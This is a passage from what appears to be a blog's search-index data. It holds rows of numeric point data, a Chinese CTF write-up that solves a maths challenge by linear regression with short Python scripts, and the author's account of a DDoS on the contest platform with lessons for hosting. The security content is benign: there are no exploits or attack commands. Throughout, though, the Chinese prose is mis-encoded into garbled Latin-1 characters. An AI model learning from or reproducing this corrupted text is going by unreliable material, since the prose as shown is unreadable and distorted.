47283.006), (368, 37593.175), (427, 43612.087), (291, 29738.352), (213, 21782.567), (442, 45142.345), (16, 1688.087), (283, 28923.066), (305, 31166.391), (339, 34635.62), (167, 17090.158), (223, 22802.122), (416, 42489.428), (10, 1076.395), (489, 49935.196), (449, 45855.695), (371, 37898.19), (94, 9644.64)] [(116, 11764.956), (494, 49944.273), (303, 30651.417), (451, 45600.484), (408, 41257.93), (422, 42672.458), (19, 1967.13), (102, 10350.819), (496, 50146.609), (347, 35096.092), (228, 23076.577), (186, 18835.061), (270, 27318.813), (53, 5401.371), (421, 42570.209), (407, 41157.05), (317, 32066.904), (276, 27925.013), (259, 26207.727), (453, 45801.337), (446, 45095.346), (166, 16814.285), (323, 32672.829), (178, 18026.726), (60, 6108.255), (12, 1260.339), (29, 2977.287), (450, 45498.85), (492, 49741.281), (218, 22066.439)] [(370, 37785.878), (278, 28401.607), (166, 16977.836), (224, 22894.401), (26, 2697.274), (110, 11265.689), (39, 4023.362), (379, 38703.214), (249, 25443.357), (266, 27178.394), (204, 20853.983), (179, 18303.84), (474, 48394.45), (444, 45334.086), (254, 25954.622), (420, 42885.767), (338, 34522.488), (22, 2289.323), (58, 5961.562), (15, 1575.394), (315, 32175.988), (29, 3003.186), (17, 1779.083), (465, 47477.351), (119, 12183.245), (363, 37072.61), (19, 1983.228), (395, 40336.878), (164, 16773.53), (380, 38805.324)] [(254, 12543.323), (44, 2253.348), (236, 11662.079), (395, 19453.074), (91, 4556.232), (315, 15532.771), (439, 21608.869), (32, 1665.213), (380, 18719.16), (272, 13425.484), (27, 1420.445), (356, 17543.092), (371, 18277.529), (353, 17395.328), (295, 14553.08), (338, 16659.262), (183, 9065.033), (374, 18424.299), (142, 7055.199), (234, 11564.408), (8, 489.253), (98, 4899.279), (120, 5977.687), (302, 14895.733), (390, 19208.331), (267, 13181.005), (423, 20825.516), (156, 7741.71), (122, 6075.745), (21, 1126.293)] [(150, 8016.821), (227, 12098.139), (261, 13900.307), (162, 8652.414), (95, 5101.549), (272, 14483.247), (43, 2345.185), (63, 3405.18), (476, 25294.643), (294, 15648.955), (481, 25560.142), (219, 11673.944), (163, 8705.953), (7, 437.04), (466, 24764.492), (147, 7857.726), (36, 1974.507), (490, 26038.59), (202, 10773.071), (330, 17556.469), (467, 24819.432), (23, 1285.311), (32, 1762.25), (85, 4571.556), (374, 19889.562), (355, 18882.738), (72, 3882.575), (48, 2610.335), (329, 17504.714), (364, 19358.515)] [(257, 14718.98), (475, 27144.037), (81, 4686.244), (109, 6282.843), (361, 20647.935), (50, 2919.492), (135, 7764.347), (21, 1266.265), (216, 12382.091), (430, 24580.106), (491, 28057.66), (87, 5028.474), (19, 1152.178), (382, 21844.316), (104, 5997.644), (232, 13293.29), (416, 23783.295), (342, 19564.978), (18, 1095.401), (176, 10102.126), (309, 17682.211), (157, 9019.065), (54, 3147.231), (158, 9076.081), (69, 4002.583), (127, 7308.433), (379, 21673.285), (431, 24638.424), (473, 27030.564), (90, 5199.474)] [(420, 21473.665), (265, 13568.853), (355, 18158.695), (301, 15405.389), (443, 22646.266), (120, 6173.475), (24, 1277.359), (305, 15609.581), (380, 19433.319), (229, 11733.252), (52, 2705.139), (410, 20964.551), (91, 4694.106), (266, 13620.62), (307, 15711.523), (459, 23463.426), (213, 10916.687), (180, 9233.946), (236, 12089.643), (376, 19230.199), (440, 22494.488), (125, 6428.384), (31, 1634.331), (426, 21781.387), (153, 7856.98), (340, 17393.99), (33, 1736.392), (252, 12905.881), (386, 19739.766), (172, 8825.891)] [(342, 15488.351), (135, 6172.774), (459, 20752.223), (358, 16207.357), (478, 21608.604), (103, 4732.814), (137, 6262.325), (269, 12203.375), (349, 15802.51), (411, 18594.199), (256, 11618.489), (270, 12248.129), (26, 1267.293), (17, 862.047), (361, 16342.428), (319, 14453.75), (427, 19312.302), (88, 4057.426), (328, 14859.053), (476, 21518.765), (399, 18053.591), (149, 6802.205), (28, 1357.121), (201, 9142.807), (50, 2347.035), (470, 21248.937), (97, 4462.399), (66, 3067.299), (344, 15578.997), (374, 16927.668)] [(212, 21514.787), (184, 18686.931), (415, 42017.302), (140, 14242.375), (275, 27877.595), (479, 48482.414), (441, 44645.368), (166, 16868.404), (205, 20807.994), (257, 26059.839), (360, 36463.631), (15, 1617.407), (357, 36159.891), (35, 3637.187), (255, 25858.387), (12, 1314.057), (288, 29191.522), (390, 39493.551), (267, 27069.547), (492, 49795.329), (269, 27271.675), (470, 47573.564), (347, 35149.842), (408, 41311.623), (71, 7273.644), (142, 14444.819), (456, 46158.953), (174, 17676.401), (474, 47977.879), (280, 28383.58)] [(404, 19495.358), (12, 678.245), (270, 13062.555), (237, 11478.449), (283, 13687.52), (248, 12006.987), (94, 4614.53), (419, 20214.805), (61, 3030.327), (21, 1110.239), (482, 23240.86), (49, 2454.045), (382, 18439.282), (426, 20550.769), (221, 10710.661), (155, 7542.195), (416, 20071.565), (55, 2742.353), (276, 13351.515), (271, 13110.676), (152, 7398.707), (405, 19542.495), (57, 2838.079), (101, 4950.13), (316, 15270.601), (459, 22135.203), (183, 8886.061), (193, 9366.336), (319, 15415.446), (344, 16615.058)] [(327, 21683.004), (138, 9208.802), (495, 32770.797), (488, 32308.797), (385, 25512.246), (21, 1486.417), (92, 6172.598), (394, 26106.215), (366, 24257.571), (115, 7690.604), (258, 17129.751), (299, 19834.484), (110, 7360.251), (252, 16732.208), (392, 25973.952), (260, 17260.445), (447, 29602.432), (335, 22212.109), (332, 22012.98), (424, 28084.729), (68, 4588.479), (98, 6568.411), (402, 26632.436), (353, 23399.551), (204, 13565.172), (113, 7558.401), (274, 18184.341), (193, 12838.195), (342, 22673.414), (361, 23927.43)] [(20, 1098.278), (455, 22848.531), (131, 6648.615), (488, 24500.666), (48, 2498.193), (276, 13899.408), (28, 1498.131), (86, 4398.853), (196, 9898.668), (326, 16398.231), (381, 19148.7), (63, 3248.501), (27, 1448.238), (386, 19399.918), (240, 12098.565), (239, 12048.603), (293, 14749.701), (363, 18248.92), (172, 8698.375), (181, 9148.851), (340, 17099.405), (265, 13349.585), (389, 19548.138), (469, 23548.322), (401, 20148.573), (353, 17749.481), (441, 22150.277), (163, 8248.245), (62, 3198.467), (436, 21899.306)] [(341, 23924.127), (184, 12933.254), (281, 19723.718), (428, 30013.631), (176, 12373.595), (364, 25533.587), (205, 14403.129), (60, 4253.335), (487, 34145.59), (112, 7893.573), (78, 5513.743), (472, 33094.006), (95, 6703.269), (199, 13984.079), (98, 6913.618), (66, 4673.34), (196, 13773.778), (104, 7333.186), (169, 11883.735), (274, 19234.415), (194, 13634.025), (266, 18673.773), (258, 18114.224), (166, 11673.939), (59, 4183.159), (413, 28964.462), (210, 14753.414), (155, 10903.648), (303, 21264.794), (390, 27353.912)] [(266, 17416.256), (417, 27231.231), (226, 14815.612), (154, 10135.945), (387, 25281.883), (232, 15205.465), (239, 15660.331), (17, 1230.284), (68, 4545.643), (20, 1425.137), (168, 11045.438), (93, 6170.171), (166, 10915.611), (26, 1815.332), (426, 27816.6), (81, 5390.485), (183, 12020.856), (156, 10265.989), (463, 30221.854), (45, 3050.258), (257, 16830.757), (271, 17740.921), (345, 22551.32), (289, 18910.733), (198, 12996.069), (332, 21705.53), (485, 31652.224), (203, 13320.834), (295, 19301.314), (14, 1035.21)] 18 è¡Œæ•°æ®ï¼Œæ¯è¡Œä¸€ä¸ª listï¼Œé‡Œé¢åŒ…å« 30 ä¸ª tupleã€‚ ç»“åˆé¢˜ç›®åå­—å’Œæè¿° ItIsMathï¼Œåº”è¯¥å°±æ˜¯å’Œæ•°å­¦æœ‰ç‚¹å…³ç³»ï¼ŒæŠŠæ•°æ®å½“æˆåæ ‡ç‚¹ï¼Œç”»ä¸€ç”»å¯ä»¥å‘ç°æ¯ä¸€è¡Œçš„ç‚¹è¿èµ·æ¥éƒ½è¿‘ä¼¼ä¸€æ¡ç›´çº¿ã€‚ åé¢ä¹Ÿæç¤ºäº†æ˜¯çº¿æ€§å›å½’ã€‚ äºæ˜¯å»ºç«‹ä¸€ä¸ªçº¿æ€§å›å½’æ¨¡å‹ï¼Œä¾æ¬¡ç®—å‡ºæ¯æ¡ç›´çº¿çš„æ–œç‡å’Œæˆªè·ï¼Œç„¶å round å–ä¸ªæ•´ï¼Œè½¬åŒ–ä¸º ASCIIï¼Œæ‹¼èµ·æ¥å°±æ˜¯ flagã€‚ Exp: from sklearn.linear_model import LinearRegression import numpy as np with open('data.txt') as f: a = f.read().splitlines() a = [eval(x) for x in a] ans = [] for i in range(len(a)): xx, yy = list(zip(*a[i])) xx = np.array(xx).reshape(-1, 1) yy = np.array(yy) linear_regression = LinearRegression(normalize=True) linear_regression.fit(xx, yy) message = linear_regression.coef_[0] print(message) ans.append(round(message)) y = linear_regression.intercept_ ans.append(round(y)) print(bytes(ans)) å¾—åˆ° flag flag{9D4f8e0f-1a5B9E35-aef0fBd2bF5A} å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ numpy çš„ polyfit æ¥ import numpy as np with open('data.txt') as f: a = f.read().splitlines() data = [eval(x) for x in a] for points in data: x = [_[0] for _ in points] y = [_[1] for _ in points] x = np.array(x) y = np.array(y) k, b = np.polyfit(x, y, 1) print(chr(int(k)), end='') print(chr(int(b)), end='') å‡ºé¢˜æ€è·¯è¿™é¢˜å…¶å®æ˜¯æ¯”èµ›å‰ä¸€å¤©æ™šä¸Šåˆ°æ¯”èµ›å½“å¤©å‡Œæ™¨å‡ºçš„ã€‚æœ¬æ¥è¿™é¢˜æ˜¯å¯æœ‰å¯æ— çš„ï¼Œæ¯•ç«Ÿ misc é¢˜ç›®å·²ç»ä¸å°‘äº†ï¼Œå¯æ˜¯å–µå–µæƒ³ç€å°±å‡ºäº†ä¸€é¢˜å¤ªå°‘äº†ï¼Œè™½ç„¶é‚£é“é¢˜æ”¾åœ¨æ ¡èµ›å¯èƒ½æœ‰ç‚¹éš¾ï¼Œä½†ä¸‡ä¸€è¢«ç§’äº†å¯ä¸å¥½ï¼Œå†å‡ºé“éš¾ä¸€ç‚¹çš„å§ã€‚ è¿™é¢˜é¢˜ç›®æè¿°é‡Œçš„ Do you remember the last NUAACTF? ï¼Œå…¶å®æ˜¯å› ä¸ºä¸Šä¸€å±Š NUAACTF ï¼ˆåœ¨ä»Šå¹´ä¸ŠåŠå¹´ï¼Œå¥½åƒæ˜¯å› ä¸ºç–«æƒ…å»¶æœŸäº†ï¼Œ233ï¼‰å‡ºäº†ä¸€é¢˜ä¹Ÿç”¨åˆ°äº†åŸŸå TXT è®°å½•çš„ï¼Œè¿™é‡Œç›¸å½“äºå›é¡¾ä¸€ä¸‹ã€‚ ä¹‹æ‰€ä»¥ TXT é‡Œæ”¾ base32ï¼Œæ˜¯å› ä¸ºä¹‹å‰å‡ºé¢˜æœ‰è¿‡æŸäº›æƒ…å†µä¸‹è§£æå‡ºæ¥å¤§å°å†™ä¼šé”…ï¼Œè€Œ base32 çš„è¯å­—æ¯å…¨æ˜¯å¤§å†™çš„å°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜äº†ã€‚ è‡³äº pikachuï¼Œå½“ç„¶ ta æ˜¯å¯çˆ±å•Šï¼Œå–µå–µè¯´æ˜¯éšæ„æ‰¾ç„¶åæ­£å¥½çœ‹åˆ°çš„ä½ ä¿¡ä¸ä¿¡å‘¢ï¼Ÿç¡®å®æ˜¯è¿™æ ·ã€‚ è¿™ä¸ª pikachu åœ¨åŸæ¥çš„åŸŸåæ‰§è¡Œçš„ç»“æœæ˜¯ ctf.asuri.club:xxxxxï¼Œä¹Ÿå°±æ˜¯å¹³å°ä¸Šçš„ä¸€ä¸ªç«¯å£ï¼Œè®¿é—®å¾—åˆ°çš„æ˜¯å’Œ https://itismath.vercel.app/ å‡ ä¹ä¸€æ ·çš„ç»“æœï¼Œä½†ç”±äºæ¯”èµ›çš„æ—¶å€™æœåŠ¡å™¨è¢« DDoS æ”»å‡»äº†ï¼Œä¹‹åæ•‘å›æ¥ç³»ç»Ÿé‡å¯äº†ï¼Œè™½ç„¶é…äº† restart=alwaysï¼Œä¸çŸ¥é“ä¸ºå•¥éƒ¨ç½²çš„å®¹å™¨è¿˜æ˜¯æ²¡äº†ï¼Œè€ƒè™‘åˆ°ç¨³å®šæ€§å’Œå¯é æ€§å¹²è„†ç›´æ¥ä¸€é”®éƒ¨ç½²åˆ° vercel å¥½äº†ã€‚ç›¸åº”åœ°ä¹Ÿå°±æ¢äº†ä¸ªåŸŸåï¼Œä¸ºäº†è®©é€‰æ‰‹ä¸ç™½åšé¢˜ï¼Œå°±è¯´èƒ½è§£å‡ºåŸæ¥çš„åŸŸåä¹Ÿç›´æ¥ç»™ä¸‹ä¸€æ­¥äº†ã€‚ æœ€åå°±æ˜¯é¢˜ç›®é‡Œè¯´çš„ Math äº†ï¼Œçº¿æ€§å›å½’ï¼Œç®—æ˜¯æ¯”è¾ƒç®€å•èƒ½æƒ³åˆ°çš„ä¸€ä¸ªæ•°å­¦åº”ç”¨å§ï¼Œç”šè‡³ä¸ºäº†ç®€å•ç»™ç›¸åº”ç³»æ•°åŠ çš„å™ªå£°ï¼ˆéšæœºæ•°ï¼‰éƒ½æå°ï¼Œè¿™ä¸ªæ‹Ÿåˆç»“æœè²Œä¼¼éƒ½ R^2=1 äº†ï¼ˆå¥½åƒæ˜¯å§ï¼Œæ‡’å¾—å†çœ‹äº† ä¸è¿‡ç”±äºå‰é¢çš„æ­¥éª¤æœ‰ç‚¹ç»•ï¼Œæ¯”èµ›çš„æ—¶å€™é—®äº†é€‰æ‰‹è¿›åº¦ï¼Œç„¶åå³ä½¿æ˜¯ç–¯ç‹‚æ”¾ hintï¼Œæœ€åä¹Ÿåªæœ‰ä¸€é˜Ÿæ ¡å¤–çš„å‡ºäº†ï¼Œæ ¡å†…ä¹Ÿæœ‰ä¸€ä¸¤é˜Ÿåˆ°çº¿æ€§å›å½’è¿™æ­¥éª¤ä½†æ²¡æ—¶é—´è§£äº†ï¼Œè¿˜æ˜¯æŒºå¯æƒœçš„å§ã€‚ è¿ç»´æ•…äº‹è¿™é‡Œå¤§æ¦‚ç®€å•ç²—ç•¥åœ°å¤ç›˜ä¸€ä¸‹å§ã€‚ æœ€å¤§çš„ä½“ä¼šå°±æ˜¯ é¢˜ç›®å’Œå¹³å°ä¸€å®šåˆ«æ”¾åŒä¸€å°æœºå™¨ä¸Šé¢ï¼Œè¢« DDoS å°±ä¸€èµ·å®Œè›‹ï¼ æ²¡é”™ï¼Œæ¯•ç«Ÿä¹‹å‰è¥¿å·¥å¤§è¿˜æ˜¯å“ªä¸ªå­¦æ ¡æ ¡èµ›å°±æœ‰è¿‡è¢« D çš„æƒ…å†µï¼Œèµ›åäº¤æµå°±è¯´æœ€å¥½æ˜¯é¶æœºå’Œå¹³å°åˆ†ç¦»ã€‚ æˆ‘ä»¬åŠæ¯”èµ›ç¬¬ä¸€æ¬¡å°è¯•ä½¿ç”¨åŠ¨æ€é¶æœºï¼Œç”¨äº† Docker + CTFd-Whaleï¼Œç»™æ¯ä¸ªå›¢é˜Ÿåˆ†äº†ç‹¬ç«‹çš„ç¯å¢ƒå’ŒåŠ¨æ€ flagï¼Œé˜²æ­¢è¢«æ…å±ï¼Œä¹Ÿæ¯”è¾ƒå…¬å¹³ï¼Œèƒ½å¼€åŠ¨æ€çš„é¢˜ç›®éƒ½å°½é‡å¼€äº†ã€‚ ä¸€å¼€å§‹å–µå–µå°±å’Œé˜Ÿé‡Œå¸ˆå‚…è¯´äº†åˆ«æ”¾ä¸€å°æœºå™¨ä¸Šçš„ï¼Œå’±æœ¬æ¥ä¹Ÿå°±å‡ºä¸ªé¢˜çš„äº‹ï¼Œå·²ç»ä¸è¯¥ç®¡å¹³å°è¿™ç§äº‹æƒ…äº†ï¼Œç»“æœæ¯”èµ›å‰å‡ å¤©é—®äº†ä¸‹ï¼Œé˜Ÿé‡Œå¸ˆå‚…ä¸´æ—¶ä¹°äº†ä¸ª 4c8G çš„æœºå™¨ï¼Œæ²¡æ­å¤šæœºå™¨åˆ†å¸ƒå¼å•¥çš„ï¼Œç”šè‡³é¢˜ç›®éƒ½æ˜¯æ¯”èµ›å‰ä¸€ä¸¤å¤©æµ‹è¯•æ€ä¹ˆéƒ¨ç½²çš„ï¼Œæ‘¸äº†ã€‚ å…¶å®æœ¬æ¥èµ›å‰è¿˜é—®äº† THUCTF é‚£è¾¹çš„å¸ˆå‚…è¦äº†ä»–ä»¬åˆ†å¸ƒå¼çš„éƒ¨ç½²æ–¹æ¡ˆï¼Œå–µå–µçœ‹äº†ï¼Œä»¥ä¸ºé˜Ÿå‹ä¹Ÿæ‹¿åˆ°äº†ï¼Œæœ€åæ¯”èµ›å‰å‡ å¤©é—®äº†æ‰å‘ç°æ²¡æœ‰ï¼Œå•Šå–µå–µä¹Ÿæœ‰é”…ã€‚ï¼ˆï¼ˆï¼ˆé€ƒ æ¯”èµ›å‰ä¸€å¤©æ™šä¸Šï¼Œå–µå–µæ¥æµ‹è¯•äº†ä¸€ä¸‹å¹³å°ï¼Œä¸€çœ‹å’‹å•¥ä¹Ÿæ²¡è·‘å†…å­˜å ç”¨éƒ½åˆ° 6G äº†ï¼Œctfd å¼€åŠ¨æ€é¶æœºæœç„¶æ¶ˆè€—ä¸å°‘èµ„æºå•Šã€‚è¿˜åœ¨æ‹…å¿ƒé¡¶ä¸é¡¶å¾—ä½ï¼Œç„¶åé‡å¯äº†ä¸€ä¸‹ï¼Œå†…å­˜å ç”¨ç¨å¾®å°äº†ä¸€ç‚¹ï¼Œåº”è¯¥è¿˜å¥½å§ã€‚ï¼ˆå½“æ™šå–µå–µè¿˜åœ¨æ€è€ƒè¦ä¸è¦å¼€ä¸ªä¸´æ—¶å¤‡ç”¨æœºå™¨æˆ–è€…æ•´ä¸ªæ ¡å†…çš„æœåŠ¡å™¨åº”æ€¥ç”¨ï¼Œç„¶è€Œå®é™…ä¸Šæ²¡å‡†å¤‡ å½“æ™šå–µå–µå‘ç°å¸¦å®½ä¸å¤§è¡Œï¼ŒåŠ è½½å›¾ç‰‡å•¥çš„è´¼æ…¢ï¼ŒåŸæ¥é¦–é¡µå¤§å›¾æ”¾çš„æ˜¯ä¸ªåå‡  MiB çš„åŸå›¾ï¼Œå¾—åŠ è½½å‡ åç§’ï¼Œäºæ˜¯å°±è®©é˜Ÿé‡Œå¸ˆå‚…å‹ç¼©äº†ä¸€ä¸‹ï¼Œç„¶åæŠŠåŸæ¥æ”¾å¹³å°ä¸Šçš„é™„ä»¶å°½é‡è½¬ç§»åˆ°å…¶ä»–å­˜å‚¨äº†ã€‚ ç»“æœç¬¬äºŒå¤©æ¯”èµ›æœç„¶å¸¦å®½ä¸è¡Œï¼Œå¼€åœºç›´æ¥å¡æ­»ï¼Œå‘ç°åŸæ¥å¸¦å®½æ‰ 5Mbpsï¼Œæœ€åä¸´æ—¶æ‰©å®¹åˆ° 50Mbps æ‰é¡ºç•…äº†ã€‚ä¹Ÿå¥½åœ¨å› ä¸ºåŠæ—¶è½¬ç§»äº†é™„ä»¶ï¼Œåœ¨å¹³å°ä¸èƒ½ç”¨çš„æ—¶å€™è‡³å°‘è¿˜èƒ½è®©é€‰æ‰‹çœ‹çœ‹é¢˜ï¼ˆ å—¯ï¼Œæ¯”èµ›è¿›è¡Œç€ï¼Œåˆ°äº†ä¸‹åˆå››ç‚¹å¤šï¼Œçªç„¶ä¸€ä¸‹å¹³å°ä¸Šä¸å»äº†ï¼Œssh è¿æ¥æ–­äº†ï¼Œå•Šï¼Œæ˜¯ DDoSï¼ å•Šï¼Œè¿˜æ˜¯åå°„ ntp çš„é‚£ç§ï¼æ ¹æœ¬æ¥ä¸åŠæ‹¦ï¼Œç¬é—´è¢«è…¾è®¯äº‘é»‘æ´äº†ã€‚ ç„¶åç¬é—´æ‡µé€¼äº†ï¼Œping ä¸é€šï¼Œssh ä¸Šä¸å»ï¼Œæœ€åå’±è®©é˜Ÿå‹ä¸Šè…¾è®¯äº‘å»èµ· vnc çœ‹çœ‹ï¼Œ800+ Mbps ç¬æ—¶æµé‡å°±ç¦»è°±å•Šï¼ä¸€ä¸ªæ ¡èµ›è€Œå·²ï¼Œå“ªä½å¤§ä½¬è¿˜èŠ±é’±ä¹° DDoS æœåŠ¡å•Šâ€¦â€¦ ä¹Ÿé é˜Ÿé‡Œçƒ­å¿ƒå­¦é•¿ç™½ç¥æ¥è¿ç»´ï¼Œå¼€äº†ç›´æ’­çœ‹ç€å®æ—¶æ’è¡Œæ¦œå’ŒæœåŠ¡å™¨çŠ¶æ€ï¼ˆä¸Šé¢æˆªå›¾ï¼‰ï¼Œä»¥åŠå¸®å¿™å¤„ç†è¢« DDoS ä¹‹åçš„åº”æ€¥ã€‚ ç”±äºåŸæ¥çš„ IP è¢«é»‘æ´äº†ï¼Œè…¾è®¯äº‘ä¹Ÿä¸ç„¶å¼€ä¹Ÿä¸è®©æ¢ï¼Œæœ€åè§£å†³æ–¹æ¡ˆæ˜¯åŠ äº†ä¸ª IPï¼Œé…é€‚é…å™¨è·¯ç”±å•¥çš„ã€‚ å™¢ï¼Œè¿˜æŠŠå¸¦å®½å¼€åˆ°äº† 100Mbpsï¼ˆ æœ€åå†æ”¹ DNS è§£æï¼Œæ”¹å¹³å°ä¸Šçš„é…ç½®å’Œé¢˜ç›®æè¿°ï¼Œæœ‰äº›ç¯å¢ƒæ²¡äº†çš„é‡æ–°èµ·ä¸€ä¸‹ï¼Œçœ‹äº†æ²¡å•¥é—®é¢˜ä¹‹åï¼Œé‡æ–°å¼€æ”¾äº†å¹³å°ã€‚ å¤§æ¦‚ä¸€ä¸ªå°æ—¶è¿‡å»äº†ï¼Œå•†é‡äº†ä¸€ä¸‹ï¼Œæ¯”èµ›å»¶é•¿ä¸€ä¸ªå°æ—¶ã€‚ ä¹‹åå°±ä¸€åˆ‡å¹³ç¨³ï¼Œæ¯”èµ›é¡ºåˆ©ç»“æŸã€‚ å¦å¤–ï¼Œå½“å¤©è¿˜æœ‰å…¶ä»–å­¦æ ¡åŠç®—æ³•æ¯”èµ›ï¼Œå¹³å°ä¹Ÿè¢« D äº†ï¼Œåˆæƒ³åˆ°ä¹‹å‰æŸæ ¡èµ›è¢«æ‰“ä¹‹ååªå¯¹æ ¡å†…å¼€æ”¾äº†ï¼Œä¹Ÿæœ‰æŸæ¯”èµ›æ¯”ç€æ¯”ç€è¢«æ‰“ä¹‹åæŠŠæ‰€æœ‰ web é¢˜ç›®éƒ½ä¸‹çº¿äº†ä¸”ä¸å†ä¸Šçº¿äº†å¤§å®¶åšå…¶ä»–é¢˜ç›®å»å§ï¼ˆç¬‘æ­» æ‰€ä»¥æœ€å¥½çš„æ–¹æ¡ˆå…¶å®è¿˜æ˜¯ å¹³å°å’Œé¶æœºåˆ†ç¦»ï¼Œå¹³å°å°½é‡å¥—ä¸ª CDN ç¼“å­˜é™æ€èµ„æºï¼Œéšè—çœŸå® IP ä¸”åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¢„é˜² DDoSï¼Œé¶æœºçš„è¯å¯ä»¥æ”¾å†…ç½‘æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡ frp ä¹‹ç±»çš„ç©¿é€å‡ºå»ï¼Œå½“ç„¶å¸¦å®½ä¹Ÿå¾—è¦ä¿è¯æ‰è¡Œã€‚å¯ä»¥çš„è¯æœºå™¨æ”¾å†…ç½‘ï¼Œç´§æ€¥æƒ…å†µä¸‹ä¿è¯æ ¡å†…è¿˜èƒ½è®¿é—®åˆ°å¹³å°å’Œé¶æœºã€‚å¹³å°æ•°æ®ä¹Ÿè¦å®šæœŸå¤‡ä»½ï¼Œæœ€å¥½è¿˜æ˜¯å¤šæœºå¤‡ä»½ï¼ˆå¼‚åœ°å®¹ç¾æ˜¯å§ 2333 å°ç»“ä»¥ä¸Šå°±æ˜¯å–µå–µå‡ºçš„ä¸¤é“é¢˜çš„å®˜æ–¹é¢˜è§£å•¦ï¼ æœ¬æ¥ä»¥ä¸ºæ ¡å¤–é€‰æ‰‹è‡³å°‘èƒ½æœ‰ä¸‰å››è§£çš„ï¼Œç»“æœæœ€åç–¯ç‹‚æ”¾ hint çš„æƒ…å†µä¸‹æ¯é“é¢˜åªæœ‰1è§£ï¼Œå¯èƒ½å‡ºå¾—æœ‰ç‚¹éš¾ï¼Œæˆ–è€…æ¯”èµ›æ—¶é—´ä¸å¤§å¤Ÿå§ï¼Œ6h ä¸‰ä¸ªäººä¸€é˜Ÿå±å®æœ‰ç‚¹éš¾äº†ã€‚ æ¯”èµ›é‚£å¤©å’Œç¾å›¢ CTFã€å­—èŠ‚ ByteCTF final å†²çªäº†ï¼Œå¯¼è‡´æ ¡èµ›æ ¡å¤–ä¹Ÿæ²¡ä»€ä¹ˆå¸ˆå‚…æ¥ç©ï¼Œå˜¤å˜¤å˜¤ã€‚ è¿™æ¬¡é˜Ÿé‡Œå¸ˆå‚…å‡ºçš„é¢˜ç›®è¿˜æ˜¯æŒºé¡¶çš„ï¼Œè€—å­é”…é”…å‡ºäº†ä¸¤é“æ¸¸æˆé¢˜ç›®é€†å‘ï¼Œå†™äº†æŒºä¹…çš„å§è¿˜æ˜¯å¾ˆè¾›è‹¦çš„ï¼Œè™½ç„¶æœ€åæ˜¯é›¶è§£ç½¢äº†ã€‚qrzbing å¸ˆå‚…å‡ºäº†ã€Šæˆ‘ä»¬ç”Ÿæ´»åœ¨å—äº¬ã€‹ç³»åˆ—æ— çº¿ç”µçš„é¢˜ç›®ï¼Œè‡´æ•¬ç¬¬ 32 å±Šä¸­å›½ç§‘å¹»é“¶æ²³å¥–â€œæœ€ä½³ç½‘ç»œç§‘å¹»å¥–â€å°è¯´ã€Šæˆ‘ä»¬ç”Ÿæ´»åœ¨å—äº¬ã€‹ï¼Œä¹Ÿæ˜¯æŒºæœ‰æ„æ€çš„ã€‚ Web çš„è¯ï¼Œé™†é˜Ÿå‡ºäº†ä¸€é“å‰å‡ å¤©çˆ†å‡ºæ¥çš„ Grafana ç›®å½•ç©¿è¶Šä»»æ„æ–‡ä»¶è¯»å– 1dayï¼ŒCVE-2021-43798ï¼Œå½“ä½œ çœŸçš„ç­¾åˆ°ã€‚ä»¥åŠä¸€é“å†·é—¨è¯­è¨€ crystal ä»¥åŠ normalize å‡½æ•°åŠè§’å…¨è§’ç»•è¿‡ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒèƒ½è€ƒå¯Ÿèƒ½åŠ›çš„ï¼ˆé›¶è§£ï¼‰ã€‚ Pwn çš„è¯ï¼Œå‡ºé¢˜å¸ˆå‚…ä¸€ä¸Šæ¥å°±å †äº†ï¼Œè¯´çœŸçš„ä¸éš¾ï¼Œå™¢ï¼Œå–µå–µä¸æ‡‚ï¼Œä½†å¤§å—éœ‡æ’¼ã€‚æœ€åé™¤äº†ä¸¤é“é¢˜æœ‰è§£å…¶ä»–å…¨æ˜¯é›¶è§£ï¼Œè¿˜æ˜¯æœ‰ç‚¹é¡¶ã€‚ Crypto çš„è¯ï¼Œè²Œä¼¼é™¤äº†æœ€åä¸€é¢˜å…¶ä»–ä¸€ä¸Šæ¥å°±è¢«å¸ˆå‚…ä»¬ç§’äº†ï¼Œå•Šï¼Œå–µå–µä¸æ‡‚ï¼Œä½†å¤§å—éœ‡æ’¼ã€‚ æœ€åçš„è§£é¢˜æƒ…å†µå¦‚å›¾æ‰€ç¤ºã€‚ å¦å¤–ï¼Œæ ¡èµ›å®˜æ–¹é¢˜è§£ ä»¥åŠ å¤§éƒ¨åˆ†é¢˜ç›® é™†ç»­å¼€æºåœ¨ Asuri æˆ˜é˜Ÿçš„ GitHub ä¸Šï¼Œè¯¦æƒ…å¯ä»¥ç§»æ­¥ https://github.com/Asuri-Team/NUAACTF2021-Challenges/ æœ‰éœ€è¦çš„å¸ˆå‚…å¯ä»¥ä¸Šå»çœ‹çœ‹ writeup å¤ç°ä¸€ä¸‹ã€‚ æœ€åï¼Œæ„Ÿè°¢å„ä½å¸ˆå‚…æ¥ç©ï¼Œå¸Œæœ›å¤§å®¶ä¹Ÿç©å¾—æ„‰å¿«ï¼æœ‰æœºä¼šä¸‹æ¬¡å†æ¥å–µ~ ä¹Ÿæ¬¢è¿æ¥æˆ‘åšå®¢è½¬è½¬å™¢~ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/12/16/CTF_2021AsuriCTF_NUAACTF_Misc/"},{"title":"CTF | 2021 NCTF/NJUPTCTF WriteUp","text":"æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼š https://www.anquanke.com/post/id/263036 ï¼ˆu1s1ï¼Œä»Šå¹´çš„æ¯”èµ›å›¾åšçš„å¥½ç®€é™‹å•Š å¼•è¨€ å‚èµ›å¯¹è±¡ ï¼šåˆ†ä¸ºæ ¡å†…é˜Ÿä¼å’Œæ ¡å¤–é˜Ÿä¼ï¼Œå…¶ä¸­æ ¡å†…é˜Ÿä¼æŒ‡ç”±å—äº¬é‚®ç”µå¤§å­¦åœ¨è¯»å­¦ç”Ÿæ‰€ç»„æˆçš„é˜Ÿä¼ã€‚ å‚èµ›è¦æ±‚ ï¼šæœ¬æ¬¡æ¯”èµ›ä»¥é˜Ÿä¼å½¢å¼æŠ¥åå‚èµ›ï¼Œæ¯é˜Ÿè‡³å¤šå››äººã€‚ æŠ¥åå¼€å§‹æ—¥æœŸ ï¼š11æœˆ22æ—¥ æŠ¥åæˆªæ­¢æ—¥æœŸ ï¼š11æœˆ26æ—¥ æ¯”èµ›æ—¶é—´ ï¼š11æœˆ27æ—¥9ï¼š00â€”â€”11æœˆ28æ—¥21ï¼š00 ä¸¾è¡Œæ–¹å¼ 